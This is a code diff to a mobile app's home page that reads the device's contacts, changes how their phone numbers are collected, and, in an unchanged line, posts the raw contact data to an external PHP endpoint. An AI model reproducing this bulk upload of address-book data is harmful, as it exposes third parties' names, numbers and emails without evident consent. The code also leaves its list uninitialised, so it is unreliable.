@@ -122,29 +122,30 @@ export class HomePage {
             ['displayName', 'name', 'phoneNumbers', 'emails'],
             { filter: "", multiple: true })
             .then(data => {
-
+                this.loading.contactlist = false;
                 let contactlist: any[];
                 for (var i = 0; i < data.length; i++) {
                     var contact = data[i];
-                    var no = data[i].name.formatted;
-                    var phonenumber = data[i].phoneNumbers;
+                    var no = contact.name.formatted;
+                    var phonenumber = contact.phoneNumbers;
                     if (phonenumber != null) {
                         for (var n = 0; n < phonenumber.length; n++) {
                             var type = phonenumber[n].type;
-                            if (type == 'mobile') {
-                                var phone = phonenumber[n].value;
-                                var mobile;
-                                if (phone.slice(0, 1) == '+' || phone.slice(0, 1) == '0') {
-                                    mobile = phone.replace(/[^a-zA-Z0-9+]/g, "");
-                                }
-                                else {
-                                    var mobile_no = phone.replace(/[^a-zA-Z0-9]/g, "");
-                                    mobile = mobile_no;
-                                }
+                            var phone = phonenumber[n].value;
+                            if (phone != '') {
+                                
+                                // var mobile;
+                                // if (phone.slice(0, 1) == '+' || phone.slice(0, 1) == '0') {
+                                //     mobile = phone.replace(/[^a-zA-Z0-9+]/g, "");
+                                // }
+                                // else {
+                                //     var mobile_no = phone.replace(/[^a-zA-Z0-9]/g, "");
+                                //     mobile = mobile_no;
+                                // }
 
                                 var contactData = {
                                     "displayName": no,
-                                    "phoneNumbers": mobile,
+                                    "phoneNumbers": phone,
                                     "emails": contact.emails
                                 }
                                 contactlist.push(contactData);
@@ -154,7 +155,6 @@ export class HomePage {
 
                 }
 
-                this.loading.contactlist = false;
                 this.dataHome['contactlist'] = contactlist;
                 this._dataService.post('http://maxtot.com/autocall.php', data).subscribe(
                     res => console.log(res),
